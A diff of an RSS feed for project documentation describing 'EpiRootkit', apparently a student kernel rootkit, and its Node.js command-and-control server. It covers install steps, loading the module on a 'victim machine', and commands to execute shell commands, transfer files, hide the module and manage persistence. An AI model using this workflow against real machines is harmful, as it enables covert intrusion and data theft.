@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Attacking Program (C2 Server) on Tux Fan Club Docs</title><link>/docs/03-attacking-program/</link><description>Recent content in Attacking Program (C2 Server) on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><atom:link href="/docs/03-attacking-program/index.xml" rel="self" type="application/rss+xml"/><item><title>README</title><link>/docs/03-attacking-program/overview/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;h1 id="attacking-program-overview">Attacking Program Overview &lt;a href="#attacking-program-overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Professional C2 (Command &amp;amp; Control) server built with Node.js providing CLI interface for managing EpiRootkit connections.&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Attacking Program (C2 Server) on Tux Fan Club Docs</title><link>/docs/03-attacking-program/</link><description>Recent content in Attacking Program (C2 Server) on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><atom:link href="/docs/03-attacking-program/index.xml" rel="self" type="application/rss+xml"/><item><title>Overview</title><link>/docs/03-attacking-program/overview/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;h1 id="attacking-program-overview">Attacking Program Overview &lt;a href="#attacking-program-overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Professional C2 (Command &amp;amp; Control) server built with Node.js providing CLI interface for managing EpiRootkit connections.&lt;/p>
 &lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
@@ -14,32 +14,31 @@
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="e92f0d9" class="language-bash ">
- &lt;code># Install and start
-cd attacking_program &amp;amp;&amp;amp; pnpm install &amp;amp;&amp;amp; pnpm start
-# Server started on port 4444
-# Web interface: http://localhost:3000
+ &lt;pre id="0658a40" class="language-bash ">
+ &lt;code># Install dependencies and start
+cd attacking_program
+pnpm install
+pnpm start
 
-# Basic usage
-c2-server$ ls
-# • Client-1 - UNAUTHENTICATED - Last seen: 6:13:09 PM
-
-c2-server$ auth Client-1 password
-# ✓ Authentication successful&lt;/code>
+# Server output
+# ✓ Server started on port 4444
+# ✓ Web interface started on port 3000&lt;/code>
  &lt;/pre>
  &lt;/div>
 &lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="core-components">Core Components &lt;a href="#core-components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
-&lt;li>&lt;strong>CLI Interface&lt;/strong>: Vorpal.js-based interactive commands&lt;/li>
-&lt;li>&lt;strong>C2 Server&lt;/strong>: Node.js TCP server for rootkit communication&lt;/li>
-&lt;li>&lt;strong>Web Interface&lt;/strong>: Basic REST API and Socket.IO dashboard&lt;/li>
+&lt;li>&lt;strong>CLI Interface&lt;/strong>: Vorpal.js-based interactive command system&lt;/li>
+&lt;li>&lt;strong>C2 Server&lt;/strong>: TCP server handling rootkit connections on port 4444&lt;/li>
+&lt;li>&lt;strong>Web Interface&lt;/strong>: Express.js REST API with Socket.IO on port 3000&lt;/li>
+&lt;li>&lt;strong>Client Manager&lt;/strong>: Connection lifecycle and authentication management&lt;/li>
+&lt;li>&lt;strong>Event System&lt;/strong>: Real-time event handling and logging&lt;/li>
 &lt;/ul>
 &lt;h3 id="technology-stack">Technology Stack &lt;a href="#technology-stack" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
 &lt;li>&lt;strong>Runtime&lt;/strong>: Node.js 18+ with pnpm package manager&lt;/li>
-&lt;li>&lt;strong>CLI&lt;/strong>: Vorpal.js for interactive command interface&lt;/li>
-&lt;li>&lt;strong>Server&lt;/strong>: Express.js with Socket.IO for real-time updates&lt;/li>
-&lt;li>&lt;strong>Encryption&lt;/strong>: Optional XOR cipher for traffic obfuscation (currently disabled on rootkit side)&lt;/li>
+&lt;li>&lt;strong>CLI Framework&lt;/strong>: Vorpal.js for interactive commands&lt;/li>
+&lt;li>&lt;strong>Web Server&lt;/strong>: Express.js with Socket.IO for real-time updates&lt;/li>
+&lt;li>&lt;strong>Encryption&lt;/strong>: XOR cipher implementation (configurable)&lt;/li>
 &lt;/ul>
-&lt;h2 id="cli-commands">CLI Commands &lt;a href="#cli-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="client-management">Client Management &lt;a href="#client-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h2 id="core-features">Core Features &lt;a href="#core-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="client-management">Client Management &lt;a href="#client-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -54,14 +53,14 @@ c2-server$ auth Client-1 password
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="780d04c" class="language-bash ">
+ &lt;pre id="168f110" class="language-bash ">
  &lt;code>ls # List connected clients
-auth &amp;lt;client&amp;gt; &amp;lt;password&amp;gt; # Authenticate with client using dynamic password
-status &amp;lt;client&amp;gt; # Get client status information
-config &amp;lt;client&amp;gt; # Interactive configuration menu&lt;/code>
+auth &amp;lt;client&amp;gt; &amp;lt;password&amp;gt; # Authenticate with SHA-512 verification
+status &amp;lt;client&amp;gt; # Get comprehensive rootkit status
+keepalive &amp;lt;client&amp;gt; # Check connection health&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="operations">Operations &lt;a href="#operations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h3 id="remote-operations">Remote Operations &lt;a href="#remote-operations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -76,13 +75,13 @@ config &amp;lt;client&amp;gt; # Interactive configuration menu&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="ae92741" class="language-bash ">
- &lt;code>exec &amp;lt;client&amp;gt; &amp;lt;command&amp;gt; # Execute shell command
-upload &amp;lt;client&amp;gt; &amp;lt;local&amp;gt; &amp;lt;remote&amp;gt; # Upload file to victim
-download &amp;lt;client&amp;gt; &amp;lt;remote&amp;gt; &amp;lt;local&amp;gt; # Download file from victim&lt;/code>
+ &lt;pre id="0779576" class="language-bash ">
+ &lt;code>exec &amp;lt;client&amp;gt; &amp;lt;command&amp;gt; # Execute shell commands
+upload &amp;lt;client&amp;gt; &amp;lt;local&amp;gt; [remote] # Upload files to victim
+download &amp;lt;client&amp;gt; &amp;lt;remote&amp;gt; [local] # Download files from victim&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="interactive-configuration">Interactive Configuration &lt;a href="#interactive-configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;h3 id="configuration-management">Configuration Management &lt;a href="#configuration-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -97,17 +96,12 @@ download &amp;lt;client&amp;gt; &amp;lt;remote&amp;gt; &amp;lt;local&amp;gt; # D
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="a1f1a2b" class="language-bash ">
- &lt;code>c2-server$ config Client-1
-# ┌─ Rootkit Configuration - Client-1
-# • [X] Module Hiding: ENABLED
-# • [X] Persistence: ENABLED
-# 
-# ? Select option: Toggle Module Hiding
-# ✓ Module hiding disabled&lt;/code>
+ &lt;pre id="e0f06c2" class="language-bash ">
+ &lt;code>config &amp;lt;client&amp;gt; # Interactive configuration menu
+persist &amp;lt;client&amp;gt; [action] # Manage persistence mechanisms&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>Available options:&lt;/p></description></item><item><title>Command Reference</title><link>/docs/03-attacking-program/commands/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/commands/</guid><description>&lt;h1 id="command-reference">Command Reference &lt;a href="#command-reference" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete reference for all C2 server commands with real examples.&lt;/p>
+&lt;h2 id="authentication-system">Authentication System &lt;a href="#authentication-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>SHA-512 Password Authentication:&lt;/strong>&lt;/p></description></item><item><title>Command Reference</title><link>/docs/03-attacking-program/commands/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/commands/</guid><description>&lt;h1 id="command-reference">Command Reference &lt;a href="#command-reference" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete reference for all C2 server commands with real examples.&lt;/p>
 &lt;h2 id="core-commands">Core Commands &lt;a href="#core-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;table>
  &lt;thead>
  &lt;tr>
@@ -164,4 +158,160 @@ download &amp;lt;client&amp;gt; &amp;lt;remote&amp;gt; &amp;lt;local&amp;gt; # D
  &lt;/tr>
  &lt;/tbody>
 &lt;/table>
-&lt;h2 id="client-management">Client Management &lt;a href="#client-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="ls--clients">&lt;code>ls&lt;/code> / &lt;code>clients&lt;/code> &lt;a href="#ls--clients" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>List connected rootkit clients with authentication status and last seen time.&lt;/p></description></item></channel></rss>
+&lt;h2 id="client-management">Client Management &lt;a href="#client-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="ls--clients">&lt;code>ls&lt;/code> / &lt;code>clients&lt;/code> &lt;a href="#ls--clients" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>List connected rootkit clients with authentication status and last seen time.&lt;/p></description></item><item><title>Installation</title><link>/docs/03-attacking-program/installation/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/installation/</guid><description>&lt;h1 id="installation-guide">Installation Guide &lt;a href="#installation-guide" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete setup instructions for the EpiRootkit C2 server.&lt;/p>
+&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="verify-prerequisites">Verify Prerequisites &lt;a href="#verify-prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="db59196" class="language-bash ">
+ &lt;code># Check Node.js version
+node --version
+
+# Check pnpm installation
+pnpm --version
+
+# Install pnpm if not available
+npm install -g pnpm&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="installation-steps">Installation Steps &lt;a href="#installation-steps" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-navigate-to-project-directory">1. Navigate to Project Directory &lt;a href="#1-navigate-to-project-directory" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="1998761" class="language-bash ">
+ &lt;code>cd attacking_program&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="2-install-dependencies">2. Install Dependencies &lt;a href="#2-install-dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="d8f3194" class="language-bash ">
+ &lt;code># Using pnpm (recommended)
+pnpm install
+
+# Or using npm
+npm install&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-review-configuration-file">1. Review Configuration File &lt;a href="#1-review-configuration-file" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="3845e8d" class="language-bash ">
+ &lt;code>cat config.env&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>&lt;strong>Default Configuration:&lt;/strong>&lt;/p></description></item><item><title>Usage Guide</title><link>/docs/03-attacking-program/usage/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/usage/</guid><description>&lt;h1 id="usage-guide">Usage Guide &lt;a href="#usage-guide" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete workflows and usage scenarios for the EpiRootkit C2 server.&lt;/p>
+&lt;h2 id="getting-started">Getting Started &lt;a href="#getting-started" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-start-the-c2-server">1. Start the C2 Server &lt;a href="#1-start-the-c2-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="12b556f" class="language-bash ">
+ &lt;code>cd attacking_program
+pnpm start&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="2-wait-for-rootkit-connection">2. Wait for Rootkit Connection &lt;a href="#2-wait-for-rootkit-connection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="5912d77" class="language-bash ">
+ &lt;code># On victim machine
+sudo insmod epirootkit.ko
+
+# C2 server will show:
+┌─ Client-1
+ ✓ [2025-05-25 16:13:29] Connected
+└─&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="3-authenticate">3. Authenticate &lt;a href="#3-authenticate" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="9e3bffe" class="language-bash ">
+ &lt;code>c2-server$ auth Client-1 &amp;lt;password&amp;gt; (default: password)
+┌─ Client-1
+ ✓ [2025-05-25 16:13:30] Authenticated
+└─&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h4 id="brute-force-protection">Brute Force Protection &lt;a href="#brute-force-protection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h4>&lt;p>Rate limit to 5 attempts per 60 seconds.&lt;/p></description></item></channel></rss>
